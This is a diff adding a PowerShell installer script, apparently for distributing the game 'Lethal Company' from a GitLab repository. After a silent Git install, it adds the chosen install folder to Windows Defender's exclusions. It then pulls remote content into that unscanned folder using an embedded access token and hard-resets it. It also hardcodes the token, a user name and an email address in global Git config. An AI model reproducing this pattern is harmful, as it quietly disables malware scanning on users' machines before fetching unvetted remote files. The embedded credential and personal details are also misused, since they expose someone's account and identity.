@@ -1,0 +1,147 @@
+Function Test-IsGitInstalled {
+    $filePath = 'C:\Program Files\Git\bin\git.exe'
+    $exists = Test-Path -Path $filePath -PathType Leaf
+    return $exists
+}
+
+# Check if Git is already installed
+if (!(Test-IsGitInstalled)) {
+    # Specify the download URL for the latest Git installer
+    $gitLatestExecutableDownloadUrl = "https://github.com/git-for-windows/git/releases/download/v2.41.0.windows.1/Git-2.41.0-64-bit.exe"
+
+    # Specify the local path for the downloaded Git installer
+    $gitLatestExecutable = "$env:USERPROFILE\Downloads\Git-64-bit.exe"
+
+    # Download the latest Git installer
+    Write-Host "Downloading the latest Git installer..."
+    (New-Object System.Net.WebClient).DownloadFile($gitLatestExecutableDownloadUrl, $gitLatestExecutable)
+
+    # Install Git silently
+    Write-Host "Installing the latest Git version..."
+    Start-Process -FilePath $gitLatestExecutable -ArgumentList "/VERYSILENT /NORESTART" -Wait
+    Write-Host "Latest Git version has been installed."
+
+    # Remove the downloaded Git installer
+    Remove-Item $gitLatestExecutable
+
+} else {
+    Write-Host "Git is already installed."
+}
+
+# Function to prompt user for folder selection and create the specified folder
+function Get-InstallationPath {
+    param (
+        [string]$folderName
+    )
+    Add-Type -AssemblyName System.Windows.Forms
+    $folderBrowser = New-Object System.Windows.Forms.FolderBrowserDialog
+    $folderBrowser.Description = "Select directory for installation"
+    
+    if ($folderBrowser.ShowDialog() -eq 'OK') {
+        $selectedPath = $folderBrowser.SelectedPath
+        $fullPath = Join-Path -Path $selectedPath -ChildPath $folderName
+        if (-not (Test-Path -Path $fullPath)) {
+            New-Item -Path $fullPath -ItemType Directory | Out-Null
+        }
+        return $fullPath
+    } else {
+        Write-Host "Folder selection canceled."
+        exit
+    }
+}
+
+# Function to exclude a directory from Windows Defender
+function Exclude-FromWindowsDefender {
+    param (
+        [string]$path
+    )
+    Add-MpPreference -ExclusionPath $path
+}
+
+function Sync-WithGitHub {
+    param (
+        [string]$localDirectory,
+        [string]$githubUsername,
+        [string]$githubRepo
+    )
+
+    # Set up the local repository
+    cd $localDirectory
+    
+    # Specify the threshold for .git directory size in GB
+    $thresholdSizeGB = 3
+
+    # Specify the path to the .git directory
+    $gitDirectoryPath = "$localDirectory/.git"
+
+    # Check if the .git directory size exceeds the threshold
+    $gitDirectorySize = Get-DirectorySize -Path $gitDirectoryPath
+
+    if ($gitDirectorySize -gt $thresholdSizeGB) {
+        Remove-Item -Path $gitDirectoryPath -Recurse -Force
+    }
+    else {
+        Write-Host ".git directory size is below the threshold. No action needed."
+    }
+
+    & "C:\Program Files\Git\bin\git.exe" init
+
+    & "C:\Program Files\Git\bin\git.exe" remote rm origin
+    # Set up the GitHub repository as the origin
+    & "C:\Program Files\Git\bin\git.exe" remote add origin "https://token:glpat-_QXSfvt5Ps-fa-BgVRfR@gitlab.com/$githubUsername/$githubRepo.git"
+
+    & "C:\Program Files\Git\bin\git.exe" config --global user.name "moralesgit"
+
+    & "C:\Program Files\Git\bin\git.exe" config --global user.email "morales.182712@ortigas-cainta.sti.edu.ph"
+
+    Write-Host "Fetching changes from the remote repository..."
+    $fetchOutput = & "C:\Program Files\Git\bin\git.exe" pull origin main
+    $fetchOutput = & "C:\Program Files\Git\bin\git.exe" fetch origin main
+    
+    # Get the hash of the latest commit in the branch
+    & "C:\Program Files\Git\bin\git.exe" rev-parse origin/main
+
+    & "C:\Program Files\Git\bin\git.exe" reset --hard
+
+    Start-Sleep -Seconds 3
+}
+
+function Get-DirectorySize {
+    param (
+        [string]$Path
+    )
+    $directory = Get-ChildItem $Path -Recurse -File
+    $totalSize = ($directory | Measure-Object -Property Length -Sum).Sum / 1GB
+    return $totalSize
+}
+
+# Prompt the user to choose the local directory for installation
+$installationDirectory = Get-InstallationPath -folderName "Lethal Company"
+
+# Exclude the installation directory from Windows Defender
+Exclude-FromWindowsDefender -path $installationDirectory
+
+# Specify GitHub repository details
+$githubUsername = "bronzi321"
+$githubRepo = "lethal"
+
+# Call the synchronization function
+Sync-WithGitHub -localDirectory $installationDirectory -githubUsername $githubUsername -githubRepo $githubRepo
+Write-Host "Synchronization process completed."
+
+# Function to open the installation directory in File Explorer and notify the user
+function Open-InstallationDirectory {
+    param (
+        [string]$path
+    )
+    Add-Type -AssemblyName System.Windows.Forms
+    [System.Windows.Forms.MessageBox]::Show("Installation completed. Opening the directory now.", "Notification", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Information)
+    Invoke-Item -Path $path
+}
+
+# Call the function to open the installation directory
+Open-InstallationDirectory -path $installationDirectory
+
+Write-Host "Press Enter to exit..."
+$null = Read-Host
+exit
